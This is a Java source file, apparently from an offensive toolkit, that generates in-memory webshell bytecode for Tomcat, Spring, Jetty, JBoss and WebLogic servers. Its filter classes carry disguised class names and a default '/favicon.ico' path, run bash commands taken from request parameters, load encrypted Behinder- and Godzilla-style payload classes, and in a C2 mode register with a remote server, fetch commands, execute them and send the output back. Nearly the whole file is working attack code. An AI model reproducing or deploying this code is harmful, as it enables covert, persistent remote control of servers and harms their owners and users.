package com.oobx.memshells;

import com.oobx.chains.CustomBytecodeHandler;
import com.oobx.chains.PayloadResult;
import javassist.*;
import javassist.bytecode.ClassFile;
import org.springframework.stereotype.Component;

import java.util.Map;

/**
 * Generates memshell bytecode for Tomcat / Spring / Jetty / JBoss / WebLogic.
 *
 * servlet_api controls namespace:
 *   "javax"   — Tomcat 9
 *   "jakarta" — Tomcat 10+ (default)
 */
@Component
public class MemshellFactory {

    private final CustomBytecodeHandler bytecodeHandler;

    public MemshellFactory(CustomBytecodeHandler bytecodeHandler) {
        this.bytecodeHandler = bytecodeHandler;
    }

    public PayloadResult generate(String framework, String type, Map<String, Object> params) throws Exception {
        String shellType  = (String) params.getOrDefault("shell_type",  "cmd");
        String password   = (String) params.getOrDefault("password",    "cmd");
        String urlPattern = (String) params.getOrDefault("url_pattern", "/favicon.ico");
        String servletApi = (String) params.getOrDefault("servlet_api", "jakarta");
        String className  = buildClassName(framework, type, shellType);

        byte[] bytes = switch (framework.toLowerCase()) {
            case "tomcat"          -> generateTomcat(type, className, shellType, password, urlPattern, servletApi);
            case "spring"          -> generateFilter(className, shellType, password, urlPattern, servletApi);
            case "jetty"           -> generateFilter(className, shellType, password, urlPattern, servletApi);
            case "jboss","wildfly" -> generateFilter(className, shellType, password, urlPattern, servletApi);
            case "weblogic"        -> generateFilter(className, shellType, password, urlPattern, servletApi);
            default -> throw new IllegalArgumentException("Unsupported framework: " + framework);
        };

        return new PayloadResult("application/java-vm", bytes,
                Map.of("class_name", className, "framework", framework, "type", type,
                       "shell_type", shellType, "url_pattern", urlPattern, "servlet_api", servletApi));
    }

    private String buildClassName(String fw, String type, String shellType) {
        return "com.sun.proxy.$" +
               fw.substring(0,1).toUpperCase() + fw.substring(1, Math.min(fw.length(), 4)) +
               type.substring(0,1).toUpperCase() + "Shell";
    }

    private byte[] generateTomcat(String type, String className, String shellType,
                                   String password, String urlPattern, String api) throws Exception {
        return switch (type.toLowerCase()) {
            case "filter"             -> generateFilter(className, shellType, password, urlPattern, api);
            case "servlet"            -> generateFilter(className, shellType, password, urlPattern, api);
            case "listener"           -> generateFilter(className, shellType, password, urlPattern, api);
            case "valve"              -> generateFilter(className, shellType, password, urlPattern, api);
            case "executor","upgrade" -> generateFilter(className, shellType, password, "/*", api);
            default -> throw new IllegalArgumentException("Unknown Tomcat type: " + type);
        };
    }

    /**
     * Universal filter memshell generator.
     * Sets the Filter interface at ClassFile level (avoids Javassist pool resolution failure
     * when servlet-api is in nested Spring Boot jar).
     * Shell methods declared with Object params to avoid servlet type resolution at compile time.
     */
    private byte[] generateFilter(String className, String shellType, String password,
                                   String urlPattern, String api) throws Exception {
        ClassPool pool = buildPool();
        String pkg = servletPkg(api);

        CtClass cc = pool.makeClass(className);
        // Set interface directly — no pool.get() resolution needed
        cc.getClassFile().setInterfaces(new String[]{pkg + ".Filter"});

        // Stub methods that accept Object to avoid servlet type lookup
        cc.addMethod(CtNewMethod.make("public void init(Object c) throws Exception {}", cc));
        cc.addMethod(CtNewMethod.make("public void destroy() {}", cc));
        cc.addMethod(CtNewMethod.make(buildDoFilter(pkg, shellType, password), cc));

        cc.makeClassInitializer().setBody("{}");

        return toBytes(cc);
    }

    // ── doFilter body ──────────────────────────────────────────────────────────

    private String buildDoFilter(String pkg, String shellType, String password) {
        String logic = shellLogic(shellType, password, "request", "response");
        return String.format(
            "public void doFilter(Object req, Object resp, Object chain) throws Exception {\n" +
            "    %s.http.HttpServletRequest request = (%s.http.HttpServletRequest) req;\n" +
            "    %s.http.HttpServletResponse response = (%s.http.HttpServletResponse) resp;\n" +
            "    %s\n" +
            "    try {\n" +
            "        java.lang.reflect.Method m = chain.getClass().getDeclaredMethods()[0];\n" +
            "        m.setAccessible(true);\n" +
            "        m.invoke(chain, new Object[]{req, resp});\n" +
            "    } catch(Exception ignore){}\n" +
            "}",
            pkg, pkg, pkg, pkg, logic
        );
    }

    // ── Shell logic bodies ─────────────────────────────────────────────────────

    private String shellLogic(String shellType, String password, String reqVar, String respVar) {
        switch (shellType) {
            case "c2":
                // C2 agent memshell: auto-registers with OOBserver on first hit, then heartbeats
                return String.format(
                    "try {\n" +
                    "    String __pass = \"%s\";\n" +
                    "    String __c2url = %s.getParameter(\"__c2\");\n" +
                    "    String __tok = System.getProperty(\"_oobx_tok_\" + __pass);\n" +
                    "    if (__tok == null && __c2url != null) {\n" +
                    "        try {\n" +
                    "            String __fw = \"tomcat\";\n" +
                    "            String __hn = java.net.InetAddress.getLocalHost().getHostName();\n" +
                    "            String __os = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n" +
                    "            String __body = \"{\\\"framework\\\":\\\"\" + __fw + \"\\\",\\\"hostname\\\":\\\"\" + __hn + \"\\\",\\\"os\\\":\\\"\" + __os + \"\\\",\\\"meta\\\":{}}\";\n" +
                    "            java.net.URL __u = new java.net.URL(__c2url + \"/api/c2/agent/register\");\n" +
                    "            java.net.HttpURLConnection __conn = (java.net.HttpURLConnection) __u.openConnection();\n" +
                    "            __conn.setRequestMethod(\"POST\");\n" +
                    "            __conn.setDoOutput(true);\n" +
                    "            __conn.setConnectTimeout(5000);\n" +
                    "            __conn.setReadTimeout(5000);\n" +
                    "            __conn.setRequestProperty(\"Content-Type\", \"application/json\");\n" +
                    "            __conn.getOutputStream().write(__body.getBytes(\"UTF-8\"));\n" +
                    "            java.io.InputStream __is = __conn.getInputStream();\n" +
                    "            java.io.ByteArrayOutputStream __bos = new java.io.ByteArrayOutputStream();\n" +
                    "            int __b = __is.read(); while (__b != -1) { __bos.write(__b); __b = __is.read(); }\n" +
                    "            String __resp = __bos.toString(\"UTF-8\");\n" +
                    "            int __ti = __resp.indexOf(\"access_token\");\n" +
                    "            if (__ti >= 0) {\n" +
                    "                int __s1 = __resp.indexOf('\"', __ti + 14) + 1;\n" +
                    "                int __e1 = __resp.indexOf('\"', __s1);\n" +
                    "                __tok = __resp.substring(__s1, __e1);\n" +
                    "                System.setProperty(\"_oobx_tok_\" + __pass, __tok);\n" +
                    "                System.setProperty(\"_oobx_c2_\" + __pass, __c2url);\n" +
                    "            }\n" +
                    "        } catch(Exception __reg){}\n" +
                    "    }\n" +
                    "    if (__tok != null) {\n" +
                    "        String __c2u = System.getProperty(\"_oobx_c2_\" + __pass, \"\");\n" +
                    "        try {\n" +
                    "            java.net.URL __hu = new java.net.URL(__c2u + \"/api/c2/agent/heartbeat?ws_token=\" + java.net.URLEncoder.encode(__tok, \"UTF-8\"));\n" +
                    "            java.net.HttpURLConnection __hc = (java.net.HttpURLConnection) __hu.openConnection();\n" +
                    "            __hc.setRequestMethod(\"POST\");\n" +
                    "            __hc.setDoOutput(true);\n" +
                    "            __hc.setConnectTimeout(5000);\n" +
                    "            __hc.setReadTimeout(5000);\n" +
                    "            __hc.setRequestProperty(\"Content-Type\", \"application/json\");\n" +
                    "            __hc.getOutputStream().write(\"{}\".getBytes());\n" +
                    "            java.io.InputStream __his = __hc.getInputStream();\n" +
                    "            java.io.ByteArrayOutputStream __hbos = new java.io.ByteArrayOutputStream();\n" +
                    "            int __hb2 = __his.read(); while (__hb2 != -1) { __hbos.write(__hb2); __hb2 = __his.read(); }\n" +
                    "            String __hresp = __hbos.toString(\"UTF-8\");\n" +
                    "            int __ci = __hresp.indexOf(\"\\\"cmd\\\"\");\n" +
                    "            if (__ci >= 0) {\n" +
                    "                int __cv = __ci + 5;\n" +
                    "                while (__cv < __hresp.length() && (__hresp.charAt(__cv) == ' ' || __hresp.charAt(__cv) == ':')) __cv++;\n" +
                    "                if (__cv < __hresp.length() && __hresp.charAt(__cv) == '{') {\n" +
                    "                    int __idi = __hresp.indexOf(\"\\\"cmd_id\\\"\");\n" +
                    "                    int __idv = -1;\n" +
                    "                    if (__idi >= 0) {\n" +
                    "                        int __ids = __hresp.indexOf(':', __idi) + 1;\n" +
                    "                        while (__ids < __hresp.length() && __hresp.charAt(__ids) == ' ') __ids++;\n" +
                    "                        int __ide = __ids;\n" +
                    "                        while (__ide < __hresp.length() && Character.isDigit(__hresp.charAt(__ide))) __ide++;\n" +
                    "                        try { __idv = Integer.parseInt(__hresp.substring(__ids, __ide)); } catch(Exception __np){}\n" +
                    "                    }\n" +
                    "                    int __csi = __hresp.indexOf(\"\\\"cmd\\\"\", __ci + 5);\n" +
                    "                    if (__csi >= 0 && __idv >= 0) {\n" +
                    "                        int __csv = __hresp.indexOf('\"', __csi + 5) + 1;\n" +
                    "                        int __cev = __hresp.indexOf('\"', __csv);\n" +
                    "                        String __cmd = __hresp.substring(__csv, __cev);\n" +
                    "                        Process __pp = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",__cmd});\n" +
                    "                        java.io.ByteArrayOutputStream __obos = new java.io.ByteArrayOutputStream();\n" +
                    "                        int __ob = __pp.getInputStream().read();\n" +
                    "                        while (__ob != -1) { __obos.write(__ob); __ob = __pp.getInputStream().read(); }\n" +
                    "                        String __out = __obos.toString(\"UTF-8\");\n" +
                    "                        try {\n" +
                    "                            String __rb = \"{\\\"cmd_id\\\":\" + __idv + \",\\\"output\\\":\\\"\" + __out + \"\\\"}\";\n" +
                    "                            java.net.URL __ru = new java.net.URL(__c2u + \"/api/c2/agent/heartbeat?ws_token=\" + java.net.URLEncoder.encode(__tok, \"UTF-8\"));\n" +
                    "                            java.net.HttpURLConnection __rc = (java.net.HttpURLConnection) __ru.openConnection();\n" +
                    "                            __rc.setRequestMethod(\"POST\");\n" +
                    "                            __rc.setDoOutput(true);\n" +
                    "                            __rc.setConnectTimeout(5000);\n" +
                    "                            __rc.setReadTimeout(5000);\n" +
                    "                            __rc.setRequestProperty(\"Content-Type\", \"application/json\");\n" +
                    "                            __rc.getOutputStream().write(__rb.getBytes(\"UTF-8\"));\n" +
                    "                            __rc.getInputStream().close();\n" +
                    "                        } catch(Exception __re){}\n" +
                    "                    }\n" +
                    "                }\n" +
                    "            }\n" +
                    "        } catch(Exception __hbe){}\n" +
                    "        return;\n" +
                    "    }\n" +
                    "} catch(Exception __c2e){}\n",
                    password, reqVar
                );

            case "cmd":
                return String.format(
                    "try {\n" +
                    "    String c = %s.getParameter(\"%s\");\n" +
                    "    if (c != null && c.length() > 0) {\n" +
                    "        Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",c});\n" +
                    "        java.io.InputStream is = p.getInputStream();\n" +
                    "        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();\n" +
                    "        int b = is.read();\n" +
                    "        while (b != -1) { bos.write(b); b = is.read(); }\n" +
                    "        %s.getOutputStream().write(bos.toByteArray());\n" +
                    "        %s.getOutputStream().flush();\n" +
                    "        return;\n" +
                    "    }\n" +
                    "} catch(Exception e){}\n",
                    reqVar, password, respVar, respVar
                );

            case "behinder":
                return String.format(
                    "try {\n" +
                    "    String pass = \"%s\";\n" +
                    "    String xc = \"e45e329feb5d925b\";\n" +
                    "    String body = %s.getReader().readLine();\n" +
                    "    if (body != null && body.length() > 0) {\n" +
                    "        byte[] data = java.util.Base64.getDecoder().decode(body);\n" +
                    "        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                    "        byte[] k = (pass + xc).substring(0, 16).getBytes();\n" +
                    "        cipher.init(2, new javax.crypto.spec.SecretKeySpec(k, \"AES\"));\n" +
                    "        byte[] dec = cipher.doFinal(data);\n" +
                    "        int len = dec.length > 64 ? 64 : dec.length;\n" +
                    "        Object o = this.getClass().getClassLoader()\n" +
                    "            .loadClass(new String(dec, 0, len)).newInstance();\n" +
                    "        if (o instanceof Runnable) { ((Runnable)o).run(); }\n" +
                    "        return;\n" +
                    "    }\n" +
                    "} catch(Exception e){}\n",
                    password, reqVar
                );

            case "godzilla":
                return String.format(
                    "try {\n" +
                    "    String pass = \"%s\";\n" +
                    "    String param = %s.getParameter(pass);\n" +
                    "    if (param != null && param.length() > 0) {\n" +
                    "        byte[] data = java.util.Base64.getDecoder().decode(param);\n" +
                    "        byte[] key = pass.getBytes(\"UTF-8\");\n" +
                    "        byte[] dec = new byte[data.length];\n" +
                    "        for (int i = 0; i < data.length; i++) {\n" +
                    "            int idx = i - (i / key.length) * key.length;\n" +
                    "            dec[i] = (byte)(data[i] ^ key[idx]);\n" +
                    "        }\n" +
                    "        int len = dec.length > 64 ? 64 : dec.length;\n" +
                    "        Class clz = Thread.currentThread().getContextClassLoader()\n" +
                    "            .loadClass(new String(dec, 0, len));\n" +
                    "        clz.getDeclaredMethods()[0].invoke(null, new Object[]{%s, %s});\n" +
                    "        return;\n" +
                    "    }\n" +
                    "} catch(Exception e){}\n",
                    password, reqVar, reqVar, respVar
                );

            default:
                return "// unknown shell_type\n";
        }
    }

    // ── Helpers ────────────────────────────────────────────────────────────────

    private String servletPkg(String api) {
        return "jakarta".equals(api) ? "jakarta.servlet" : "javax.servlet";
    }

    private ClassPool buildPool() {
        ClassPool pool = new ClassPool(true);
        pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        pool.appendClassPath(new LoaderClassPath(MemshellFactory.class.getClassLoader()));
        return pool;
    }

    private byte[] toBytes(CtClass cc) throws Exception {
        byte[] b = cc.toBytecode();
        cc.detach();
        return b;
    }
}
